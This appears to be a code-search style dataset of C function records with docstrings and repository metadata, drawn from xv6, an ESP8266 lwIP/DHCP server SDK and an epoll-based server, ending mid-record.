{"docstring": "// Release a B_BUSY buffer.\n// Move to the head of the MRU list.\n", "func_signal": "void\nbrelse(struct buf *b)", "code": "{\n  if((b->flags & B_BUSY) == 0)\n    panic(\"brelse\");\n\n  acquire(&bcache.lock);\n\n  b->next->prev = b->prev;\n  b->prev->next = b->next;\n  b->next = bcache.head.next;\n  b->prev = &bcache.head;\n  bcache.head.next->prev = b;\n  bcache.head.next = b;\n\n  b->flags &= ~B_BUSY;\n  wakeup(b);\n\n  release(&bcache.lock);\n}", "path": "bio.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Get metadata about file f.\n", "func_signal": "int\nfilestat(struct file *f, struct stat *st)", "code": "{\n  if(f->type == FD_INODE){\n    ilock(f->ip);\n    stati(f->ip, st);\n    iunlock(f->ip);\n    return 0;\n  }\n  return -1;\n}", "path": "file.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n/*\n * \ufffd\ufffdDHCP msg\ufffd\ufffd\u03e2\ufffd\u1e79\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n *\n * @param optptr -- DHCP msg\ufffd\ufffd\u03e2\u03bb\ufffd\ufffd\n * @param type -- \u04aa\ufffd\ufffd\u04f5\ufffd\ufffd\ufffd\ufffd\ufffdoption\n *\n * @return uint8_t* \ufffd\ufffd\ufffd\ufffdDHCP msg\u01ab\ufffd\u01b5\ufffd\u05b7\n */\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "static uint8_t* ICACHE_FLASH_ATTR add_msg_type(uint8_t *optptr, uint8_t type)", "code": "{\n\n        *optptr++ = DHCP_OPTION_MSG_TYPE;\n        *optptr++ = 1;\n        *optptr++ = type;\n        return optptr;\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Same as ipaddr_ntoa, but reentrant since a user-supplied buffer is used.\n *\n * @param addr ip address in network order to convert\n * @param buf target buffer where the string is stored\n * @param buflen length of buf\n * @return either pointer to buf which now holds the ASCII\n *         representation of addr or NULL if buf was too small\n */\n", "func_signal": "char *ipaddr_ntoa_r(const ip_addr_t *addr, char *buf, int buflen)", "code": "{\n  u32_t s_addr;\n  char inv[3];\n  char *rp;\n  u8_t *ap;\n  u8_t rem;\n  u8_t n;\n  u8_t i;\n  int len = 0;\n\n  s_addr = ip4_addr_get_u32(addr);\n\n  rp = buf;\n  ap = (u8_t *)&s_addr;\n  for(n = 0; n < 4; n++) {\n    i = 0;\n    do {\n      rem = *ap % (u8_t)10;\n      *ap /= (u8_t)10;\n      inv[i++] = '0' + rem;\n    } while(*ap);\n    while(i--) {\n      if (len++ >= buflen) {\n        return NULL;\n      }\n      *rp++ = inv[i];\n    }\n    if (len++ >= buflen) {\n      return NULL;\n    }\n    *rp++ = '.';\n    ap++;\n  }\n  *--rp = 0;\n  return buf;\n}", "path": "app\\sdklib\\lwip\\core\\ipv4\\ip_addr.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Send data to a specified address using UDP.\n *\n * @param pcb UDP PCB used to send the data.\n * @param p chain of pbuf's to be sent.\n * @param dst_ip Destination IP address.\n * @param dst_port Destination UDP port.\n *\n * dst_ip & dst_port are expected to be in the same byte order as in the pcb.\n *\n * If the PCB already has a remote address association, it will\n * be restored after the data is sent.\n * \n * @return lwIP error code (@see udp_send for possible error codes)\n *\n * @see udp_disconnect() udp_send()\n */\n", "func_signal": "err_t ICACHE_FLASH_ATTR\nudp_sendto(struct udp_pcb *pcb, struct pbuf *p,\n  ip_addr_t *dst_ip, u16_t dst_port)", "code": "{\n#if LWIP_CHECKSUM_ON_COPY\n  return udp_sendto_chksum(pcb, p, dst_ip, dst_port, 0, 0);\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Create a UDP PCB.\n *\n * @return The UDP PCB which was created. NULL if the PCB data structure\n * could not be allocated.\n *\n * @see udp_remove()\n */\n", "func_signal": "struct udp_pcb * ICACHE_FLASH_ATTR\nudp_new(void)", "code": "{\n  struct udp_pcb *pcb;\n  pcb = (struct udp_pcb *)memp_malloc(MEMP_UDP_PCB);\n  /* could allocate UDP PCB? */\n  if (pcb != NULL) {\n    /* UDP Lite: by initializing to all zeroes, chksum_len is set to 0\n     * which means checksum is generated over the whole datagram per default\n     * (recommended as default by RFC 3828). */\n    /* initialize PCB to all zeroes */\n    os_memset(pcb, 0, sizeof(struct udp_pcb));\n    pcb->ttl = UDP_TTL;\n  }\n  return pcb;\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/******************************************************************************\n * FunctionName : node_delete_from_list\n * Description  : remove the node from list\n * Parameters   : arg -- Additional argument to pass to the callback function\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR node_remove_from_list(list_node **phead, list_node* pdelete)", "code": "{\n\tlist_node *plist = NULL;\n\n\tplist = *phead;\n\tif (plist == NULL){\n\t\t*phead = NULL;\n\t} else {\n\t\tif (plist == pdelete){\n\t\t\t*phead = plist->pnext;\n\t\t} else {\n\t\t\twhile (plist != NULL) {\n\t\t\t\tif (plist->pnext == pdelete){\n\t\t\t\t\tplist->pnext = pdelete->pnext;\n\t\t\t\t}\n\t\t\t\tplist = plist->pnext;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n/*\n * \ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffdOFFER\n *\n * @param -- m \u05b8\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\u0375\ufffdDHCP msg\ufffd\ufffd\ufffd\ufffd\n */\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "static void ICACHE_FLASH_ATTR send_offer(struct dhcps_msg *m)", "code": "{\n        uint8_t *end;\n\t    struct pbuf *p, *q;\n\t    u8_t *data;\n\t    u16_t cnt=0;\n\t    u16_t i;\n        create_msg(m);\n\n        end = add_msg_type(&m->options[4], DHCPOFFER);\n        end = add_offer_options(end);\n        end = add_end(end);\n\n\t    p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dhcps_msg), PBUF_RAM);\n#if DHCPS_DEBUG\n\t\tos_printf(\"udhcp: send_offer>>p->ref = %d\\n\", p->ref);\n#endif\n\t    if(p != NULL){\n\t       \n#if DHCPS_DEBUG\n\t        os_printf(\"dhcps: send_offer>>pbuf_alloc succeed\\n\");\n\t        os_printf(\"dhcps: send_offer>>p->tot_len = %d\\n\", p->tot_len);\n\t        os_printf(\"dhcps: send_offer>>p->len = %d\\n\", p->len);\n#endif\n\t        q = p;\n\t        while(q != NULL){\n\t            data = (u8_t *)q->payload;\n\t            for(i=0; i<q->len; i++)\n\t            {\n\t                data[i] = ((u8_t *) m)[cnt++];\n#if DHCPS_DEBUG\n\t\t\t\t\tos_printf(\"%02x \",data[i]);\n\t\t\t\t\tif((i+1)%16 == 0){\n\t\t\t\t\t\tos_printf(\"\\n\");\n\t\t\t\t\t}\n#endif\n\t            }\n\n\t            q = q->next;\n\t        }\n\t    }else{\n\t        \n#if DHCPS_DEBUG\n\t        os_printf(\"dhcps: send_offer>>pbuf_alloc failed\\n\");\n#endif\n\t        return;\n\t    }\n#if DHCPS_DEBUG\n\t    err_t SendOffer_err_t = udp_sendto( pcb_dhcps, p, &broadcast_dhcps, DHCPS_CLIENT_PORT );\n\t    os_printf(\"dhcps: send_offer>>udp_sendto result %x\\n\", SendOffer_err_t);\n#else\n\t    udp_sendto( pcb_dhcps, p, &broadcast_dhcps, DHCPS_CLIENT_PORT );\n#endif\n\t    if(p->ref != 0){\t\n#if DHCPS_DEBUG\n\t        os_printf(\"udhcp: send_offer>>free pbuf\\n\");\n#endif\n\t        pbuf_free(p);\n\t    }\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "static void ICACHE_FLASH_ATTR wifi_softap_init_dhcps_lease(uint32 ip)", "code": "{\n\tuint32 softap_ip = ip & ((1 << 24) - 1); // 0x00FFFFFF;\n\tif (dhcps_lease_flag == TRUE) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430\n\t\tif(softap_ip != (dhcps_lease.start_ip.addr & ((1 << 24) - 1))\n\t\t ||softap_ip != (dhcps_lease.end_ip.addr & ((1 << 24) - 1))\n\t\t ||dhcps_lease.end_ip.addr - dhcps_lease.start_ip.addr > (DHCPS_MAX_LEASE << 24)\n\t\t ||(ip >= dhcps_lease.start_ip.addr && ip <= dhcps_lease.end_ip.addr)) // \u043f\u043e\u043f\u0430\u0434\u0430\u0435\u0442 \u0432 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\n\t\t\tdhcps_lease_flag = FALSE;\n\t}\n\tif (dhcps_lease_flag == FALSE) { // dhcps_lease \u043d\u0435 \u0437\u0430\u0434\u0430\u0432\u0430\u043b\u0430\u0441\u044c -> \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0430\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430\n\t    uint32 local_ip = ip & (255 << 24); // 0xFF000000;\n\t\tif (local_ip >= (128 << 24))\n\t\t\tlocal_ip -= (DHCPS_MAX_LEASE + 1) << 24;\n\t\telse\n\t\t\tlocal_ip += 1 << 24;\n\t\tdhcps_lease.start_ip.addr = softap_ip | local_ip;\n\t\tdhcps_lease.end_ip.addr = softap_ip | (local_ip + (DHCPS_MAX_LEASE << 24));\n\t}\n#if DHCPS_DEBUG\n\tos_printf(\"start_ip = 0x%x, end_ip = 0x%x, enable=%u\\n\",dhcps_lease.start_ip, dhcps_lease.end_ip, dhcps_lease_flag);\n#endif\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Check whether \"cp\" is a valid ascii representation\n * of an Internet address and convert to a binary address.\n * Returns 1 if the address is valid, 0 if not.\n * This replaces inet_addr, the return value from which\n * cannot distinguish between failure and a local broadcast address.\n *\n * @param cp IP address in ascii represenation (e.g. \"127.0.0.1\")\n * @param addr pointer to which to save the ip address in network order\n * @return 1 if cp could be converted to addr, 0 on failure\n */\n", "func_signal": "int\nipaddr_aton(const char *cp, ip_addr_t *addr)", "code": "{\n  u32_t val;\n  u8_t base;\n  char c;\n  char ch;\n  unsigned long cutoff;\n  int cutlim;\n  u32_t parts[4];\n  u32_t *pp = parts;\n\n  c = *cp;\n  for (;;) {\n    /*\n     * Collect number up to ``.''.\n     * Values are specified as for C:\n     * 0x=hex, 0=octal, 1-9=decimal.\n     */\n    if (!isdigit(c))\n      return (0);\n    val = 0;\n    base = 10;\n    if (c == '0') {\n      c = *++cp;\n      if (c == 'x' || c == 'X') {\n        base = 16;\n        c = *++cp;\n      } else\n        base = 8;\n    }\n\n    cutoff =(unsigned long)0xffffffff / (unsigned long)base;\n    cutlim =(unsigned long)0xffffffff % (unsigned long)base;\n\n    for (;;) {\n      if (isdigit(c)) {\n    \tch = (int)(c - '0');\n\n    \tif (val > cutoff || (val == cutoff && ch > cutlim))\n    \t\treturn (0);\n\n        val = (val * base) + (int)(c - '0');\n        c = *++cp;\n      } else if (base == 16 && isxdigit(c)) {\n    \tch = (int)(c + 10 - (islower(c) ? 'a' : 'A'));\n\n    \tif (val > cutoff || (val == cutoff && ch > cutlim))\n    \t\treturn (0);\n\n    \tval = (val << 4) | (int)(c + 10 - (islower(c) ? 'a' : 'A'));\n        c = *++cp;\n      } else\n        break;\n    }\n    if (c == '.') {\n      /*\n       * Internet format:\n       *  a.b.c.d\n       *  a.b.c   (with c treated as 16 bits)\n       *  a.b (with b treated as 24 bits)\n       */\n      if (pp >= parts + 3) {\n        return (0);\n      }\n      *pp++ = val;\n      c = *++cp;\n    } else\n      break;\n  }\n  /*\n   * Check for trailing characters.\n   */\n  if (c != '\\0' && !isspace(c)) {\n    return (0);\n  }\n  /*\n   * Concoct the address according to\n   * the number of parts specified.\n   */\n  switch (pp - parts + 1) {\n\n  case 0:\n    return (0);       /* initial nondigit */\n\n  case 1:             /* a -- 32 bits */\n    break;\n\n  case 2:             /* a.b -- 8.24 bits */\n    if ((val > 0xffffffUL) || (parts[0] > 0xff)) {\n      return (0);\n    }\n    val |= parts[0] << 24;\n    break;\n\n  case 3:             /* a.b.c -- 8.8.16 bits */\n    if ((val > 0xffff) || (parts[0] > 0xff) || (parts[1] > 0xff)) {\n      return (0);\n    }\n    val |= (parts[0] << 24) | (parts[1] << 16);\n    break;\n\n  case 4:             /* a.b.c.d -- 8.8.8.8 bits */\n    if ((val > 0xff) || (parts[0] > 0xff) || (parts[1] > 0xff) || (parts[2] > 0xff)) {\n      return (0);\n    }\n    val |= (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8);\n    break;\n  default:\n    LWIP_ASSERT(\"unhandled\", 0);\n    break;\n  }\n  if (addr) {\n    ip4_addr_set_u32(addr, htonl(val));\n  }\n  return (1);\n}", "path": "app\\sdklib\\lwip\\core\\ipv4\\ip_addr.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Print UDP header information for debug purposes.\n *\n * @param udphdr pointer to the udp header in memory.\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nudp_debug_print(struct udp_hdr *udphdr)", "code": "{\n  LWIP_DEBUGF(UDP_DEBUG, (\"UDP header:\\n\"));\n  LWIP_DEBUGF(UDP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(UDP_DEBUG, (\"|     %5\"U16_F\"     |     %5\"U16_F\"     | (src port, dest port)\\n\",\n                          ntohs(udphdr->src), ntohs(udphdr->dest)));\n  LWIP_DEBUGF(UDP_DEBUG, (\"+-------------------------------+\\n\"));\n  LWIP_DEBUGF(UDP_DEBUG, (\"|     %5\"U16_F\"     |     0x%04\"X16_F\"    | (len, chksum)\\n\",\n                          ntohs(udphdr->len), ntohs(udphdr->chksum)));\n  LWIP_DEBUGF(UDP_DEBUG, (\"+-------------------------------+\\n\"));\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void ICACHE_FLASH_ATTR dhcps_start(struct ip_info *info)", "code": "{\n\tstruct netif * apnetif = (struct netif *)eagle_lwip_getif(0x01);\n    \n\tif(apnetif->dhcps_pcb != NULL) {\n        udp_remove(apnetif->dhcps_pcb);\n    }\n    if(dhcps_lease_time == 0) dhcps_lease_time = DHCPS_LEASE_TIME_DEF;\n\n\tpcb_dhcps = udp_new();\n\tif (pcb_dhcps == NULL || info ==NULL) {\n\t\tos_printf(\"dhcps_start(): could not obtain pcb\\n\");\n\t}\n\n\tapnetif->dhcps_pcb = pcb_dhcps;\n\n\tIP4_ADDR(&broadcast_dhcps, 255, 255, 255, 255);\n\n\tserver_address = info->ip;\n\twifi_softap_init_dhcps_lease(server_address.addr);\n\tclient_address_plus.addr = dhcps_lease.start_ip.addr;\n\n\tudp_bind(pcb_dhcps, IP_ADDR_ANY, DHCPS_SERVER_PORT);\n\tudp_recv(pcb_dhcps, handle_dhcp, NULL);\n#if DHCPS_DEBUG\n\tos_printf(\"dhcps:dhcps_start->udp_recv function Set a receive callback handle_dhcp for UDP_PCB pcb_dhcps\\n\");\n#endif\n\t\t\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/** Same as udp_send() but with checksum\n */\n", "func_signal": "err_t ICACHE_FLASH_ATTR\nudp_send_chksum(struct udp_pcb *pcb, struct pbuf *p,\n                u8_t have_chksum, u16_t chksum)", "code": "{\n  /* send to the packet using remote ip and port stored in the pcb */\n  return udp_sendto_chksum(pcb, p, &pcb->remote_ip, pcb->remote_port,\n    have_chksum, chksum);\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n/*\n * \ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffdNAK\ufffd\ufffd\u03e2\n *\n * @param m \u05b8\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\u0375\ufffdDHCP msg\ufffd\ufffd\ufffd\ufffd\n */\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "static void ICACHE_FLASH_ATTR send_nak(struct dhcps_msg *m)", "code": "{\n\n    \tu8_t *end;\n\t    struct pbuf *p, *q;\n\t    u8_t *data;\n\t    u16_t cnt=0;\n\t    u16_t i;\n        create_msg(m);\n\n        end = add_msg_type(&m->options[4], DHCPNAK);\n        end = add_end(end);\n\n\t    p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dhcps_msg), PBUF_RAM);\n#if DHCPS_DEBUG\n\t\tos_printf(\"udhcp: send_nak>>p->ref = %d\\n\", p->ref);\n#endif\n\t    if(p != NULL){\n\t        \n#if DHCPS_DEBUG\n\t        os_printf(\"dhcps: send_nak>>pbuf_alloc succeed\\n\");\n\t        os_printf(\"dhcps: send_nak>>p->tot_len = %d\\n\", p->tot_len);\n\t        os_printf(\"dhcps: send_nak>>p->len = %d\\n\", p->len);\n#endif\n\t        q = p;\n\t        while(q != NULL){\n\t            data = (u8_t *)q->payload;\n\t            for(i=0; i<q->len; i++)\n\t            {\n\t                data[i] = ((u8_t *) m)[cnt++];\n#if DHCPS_DEBUG\t\t\t\t\t\n\t\t\t\t\tos_printf(\"%02x \",data[i]);\n\t\t\t\t\tif((i+1)%16 == 0){\n\t\t\t\t\t\tos_printf(\"\\n\");\n\t\t\t\t\t}\n#endif\n\t            }\n\n\t            q = q->next;\n\t        }\n\t    }else{\n\t        \n#if DHCPS_DEBUG\n\t        os_printf(\"dhcps: send_nak>>pbuf_alloc failed\\n\");\n#endif\n\t        return;\n    \t}\n#if DHCPS_DEBUG\n\t\terr_t SendNak_err_t = udp_sendto( pcb_dhcps, p, &broadcast_dhcps, DHCPS_CLIENT_PORT );\n        os_printf(\"dhcps: send_nak>>udp_sendto result %x\\n\",SendNak_err_t);\n#else\n        udp_sendto( pcb_dhcps, p, &broadcast_dhcps, DHCPS_CLIENT_PORT );\n#endif\n \t    if(p->ref != 0){\n#if DHCPS_DEBUG\t\t\t\n\t        os_printf(\"udhcp: send_nak>>free pbuf\\n\");\n#endif\n\t        pbuf_free(p);\n\t    }\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Disconnect a UDP PCB\n *\n * @param pcb the udp pcb to disconnect.\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nudp_disconnect(struct udp_pcb *pcb)", "code": "{\n  /* reset remote address association */\n  ip_addr_set_any(&pcb->remote_ip);\n  pcb->remote_port = 0;\n  /* mark PCB as unconnected */\n  pcb->flags &= ~UDP_FLAGS_CONNECTED;\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/******************************************************************************\n * FunctionName : wifi_softap_get_dhcps_lease\n * Description  : get the lease information of DHCP server\n * Parameters   : please -- Additional argument to get the lease information,\n * \t\t\t\t\t\t\tLittle-Endian.\n * Returns      : true or false\n*******************************************************************************/\n", "func_signal": "bool ICACHE_FLASH_ATTR wifi_softap_get_dhcps_lease(struct dhcps_lease *please)", "code": "{\n\tif (NULL == please)\n\t\treturn false;\n\tplease->start_ip.addr = dhcps_lease.start_ip.addr;\n\tplease->end_ip.addr = dhcps_lease.end_ip.addr;\n\treturn true;\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Convert numeric IP address into decimal dotted ASCII representation.\n * returns ptr to static buffer; not reentrant!\n *\n * @param addr ip address in network order to convert\n * @return pointer to a global static (!) buffer that holds the ASCII\n *         represenation of addr\n */\n", "func_signal": "char *\nipaddr_ntoa(const ip_addr_t *addr)", "code": "{\n  static char str[16];\n  return ipaddr_ntoa_r(addr, str, 16);\n}", "path": "app\\sdklib\\lwip\\core\\ipv4\\ip_addr.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "///////////////////////////////////////////////////////////////////////////////////\n///////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "static void ICACHE_FLASH_ATTR create_msg(struct dhcps_msg *m)", "code": "{\n        struct ip_addr client;\n\n        client.addr = *( (uint32_t *) &client_address);\n\n        m->op = DHCP_REPLY;\n        m->htype = DHCP_HTYPE_ETHERNET;\n        m->hlen = 6;  \n        m->hops = 0;\n//        os_memcpy((char *) xid, (char *) m->xid, sizeof(m->xid));\n        m->secs = 0;\n        m->flags = htons(BOOTP_BROADCAST); \n\n        os_memcpy((char *) m->yiaddr, (char *) &client.addr, sizeof(m->yiaddr));\n\n        os_memset((char *) m->ciaddr, 0, sizeof(m->ciaddr));\n        os_memset((char *) m->siaddr, 0, sizeof(m->siaddr));\n        os_memset((char *) m->giaddr, 0, sizeof(m->giaddr));\n        os_memset((char *) m->sname, 0, sizeof(m->sname));\n        os_memset((char *) m->file, 0, sizeof(m->file));\n\n        os_memset((char *) m->options, 0, sizeof(m->options));\n        os_memcpy((char *) m->options, &magic_cookie, sizeof(magic_cookie));\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Remove an UDP PCB.\n *\n * @param pcb UDP PCB to be removed. The PCB is removed from the list of\n * UDP PCB's and the data structure is freed from memory.\n *\n * @see udp_new()\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nudp_remove(struct udp_pcb *pcb)", "code": "{\n  struct udp_pcb *pcb2;\n\n  snmp_delete_udpidx_tree(pcb);\n  /* pcb to be removed is first in list? */\n  if (udp_pcbs == pcb) {\n    /* make list start at 2nd pcb */\n    udp_pcbs = udp_pcbs->next;\n    /* pcb not 1st in list */\n  } else {\n    for (pcb2 = udp_pcbs; pcb2 != NULL; pcb2 = pcb2->next) {\n      /* find pcb in udp_pcbs list */\n      if (pcb2->next != NULL && pcb2->next == pcb) {\n        /* remove pcb from list */\n        pcb2->next = pcb->next;\n      }\n    }\n  }\n  memp_free(MEMP_UDP_PCB, pcb);\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/******************************************************************************\n * FunctionName : wifi_softap_set_dhcps_lease\n * Description  : set the lease information of DHCP server\n * Parameters   : please -- Additional argument to set the lease information,\n * \t\t\t\t\t\t\tLittle-Endian.\n * Returns      : true or false\n*******************************************************************************/\n", "func_signal": "bool ICACHE_FLASH_ATTR wifi_softap_set_dhcps_lease(struct dhcps_lease *please)", "code": "{\n\tif (please == NULL || (please->end_ip.addr - please->start_ip.addr > (DHCPS_MAX_LEASE << 24)))\n\t\t\treturn false;\n\tdhcps_lease.start_ip.addr = please->start_ip.addr;\n\tdhcps_lease.end_ip.addr = please->end_ip.addr;\n\tdhcps_lease_flag = true;\n\treturn true;\n}", "path": "app\\sdklib\\lwip\\app\\dhcpserver.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/**\n * Set a receive callback for a UDP PCB\n *\n * This callback will be called when receiving a datagram for the pcb.\n *\n * @param pcb the pcb for wich to set the recv callback\n * @param recv function pointer of the callback function\n * @param recv_arg additional argument to pass to the callback function\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nudp_recv(struct udp_pcb *pcb, udp_recv_fn recv, void *recv_arg)", "code": "{\n  /* remember recv() callback and user data */\n  pcb->recv = recv;\n  pcb->recv_arg = recv_arg;\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "/** Same as udp_sendto(), but with checksum */\n", "func_signal": "err_t ICACHE_FLASH_ATTR\nudp_sendto_chksum(struct udp_pcb *pcb, struct pbuf *p, ip_addr_t *dst_ip,\n                  u16_t dst_port, u8_t have_chksum, u16_t chksum)", "code": "{\n#endif /* LWIP_CHECKSUM_ON_COPY */\n  struct netif *netif;\n\n  LWIP_DEBUGF(UDP_DEBUG | LWIP_DBG_TRACE, (\"udp_send\\n\"));\n\n  /* find the outgoing network interface for this packet */\n#if LWIP_IGMP\n  netif = ip_route((ip_addr_ismulticast(dst_ip))?(&(pcb->multicast_ip)):(dst_ip));\n#else\n  netif = ip_route(dst_ip);\n#endif /* LWIP_IGMP */\n\n  /* no outgoing network interface could be found? */\n  if (netif == NULL) {\n    LWIP_DEBUGF(UDP_DEBUG | LWIP_DBG_LEVEL_SERIOUS, (\"udp_send: No route to %\"U16_F\".%\"U16_F\".%\"U16_F\".%\"U16_F\"\\n\",\n      ip4_addr1_16(dst_ip), ip4_addr2_16(dst_ip), ip4_addr3_16(dst_ip), ip4_addr4_16(dst_ip)));\n    UDP_STATS_INC(udp.rterr);\n    return ERR_RTE;\n  }\n#if LWIP_CHECKSUM_ON_COPY\n  return udp_sendto_if_chksum(pcb, p, dst_ip, dst_port, netif, have_chksum, chksum);\n#else /* LWIP_CHECKSUM_ON_COPY */\n  return udp_sendto_if(pcb, p, dst_ip, dst_port, netif);\n#endif /* LWIP_CHECKSUM_ON_COPY */\n}", "path": "app\\sdklib\\lwip\\core\\udp.c", "repo_name": "pvvx/MinEspSDKLib", "stars": 107, "license": "unlicense", "language": "c", "size": 5375}
{"docstring": "// \u5b50\u8fdb\u7a0b\u6267\u884c\u4f53\n", "func_signal": "int process_run(int sfd, slock *sl)", "code": "{\n    int efd, ret, i;\n    int ln = 0; // \u8fde\u63a5\u6570\n    int ls = -1; // \u9501\u51fd\u6570\u7684\u8fd4\u56de\u503c\n    char buf[100];\n\n    struct epoll_event event;\n    struct epoll_event events[MAX_EVENTS];\n\n    // \u6bcf\u4e2a\u5b50\u8fdb\u7a0b\u521b\u5efa\u81ea\u5df1\u7684epoll fd\n    efd = epoll_create(MAX_EVENTS);\n    if (efd < 0) {\n        error_log(\"epoll_create error\", DEBUGARGS);\n        return -1;\n    }\n\n    // \u4e8b\u4ef6\u5faa\u73af\n    while (1) {\n        /*\n         * \u5224\u65ad\u8fde\u63a5\u6570\u662f\u5426\u4e3a0\uff0c\u4e3a0,\u963b\u585e\u7b49\u5f85\n         * \u4e0d\u4e3a0,\u975e\u963b\u585e\u7b49\u5f85\u9501\n         */\n\n        // \u5224\u65ad\u662f\u5426\u5df2\u7ecf\u83b7\u5f97\u4e86\u9501\n        if (ls == -1) { // \u672a\u83b7\u5f97\u9501\n            if (ln > 0) {\n                ls = p(sl, 0);\n            } else {\n                // \u963b\u585e\u7b49\u5f85\u9501\n                ls = p(sl, 1);\n                if (ls == -1) {\n                    continue;\n                }\n            }\n\n            if (ls == 0) {\n                // \u83b7\u53d6\u5230\u9501\uff0c\u5c06\u76d1\u542c\u5957\u63a5\u5b57sfd\u52a0\u5165epoll\u4e2d\n                event.data.fd = sfd;\n                event.events = EPOLLIN;\n                if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) < 0) {\n                    v(sl);\n                    ls = -1;\n                    if (ln == 0) {\n                        continue;\n                    }\n                }\n            }\n        }\n\n        int j, n;\n        n = epoll_wait(efd, events, MAX_EVENTS, -1);\n        if (n < 1) {\n            error_log(\"epoll_wait error\", DEBUGARGS);\n            return -1;\n        }\n\n        for (j = 0; j < n; j++) {\n\n            if ((events[j].events & EPOLLERR) || (events[j].events & EPOLLHUP) || \n                    !(events[j].events & EPOLLIN)) {\n\n                // \u4eceepoll\u5220\u9664\u8be5\u76d1\u542c\u5957\u63a5\u5b57\n                epoll_ctl(efd, EPOLL_CTL_DEL, events[j].data.fd, NULL);\n\n                // \u5173\u95ed\u8be5\u5957\u63a5\u5b57\n                if (events[j].data.fd != sfd) {\n                    close(events[j].data.fd);\n                }\n\n                // \u91ca\u653e\u9501\n                if (ls == 0) {\n                    v(sl);\n                    ls = -1;\n                }\n            }\n            // \u6709\u8fde\u63a5\u8bf7\u6c42\n            else if ((events[j].events & EPOLLIN) && (events[j].data.fd == sfd)) {\n                struct sockaddr in_addr;\n                socklen_t in_len;\n                int infd;\n                memset(&in_addr, 0, sizeof(struct 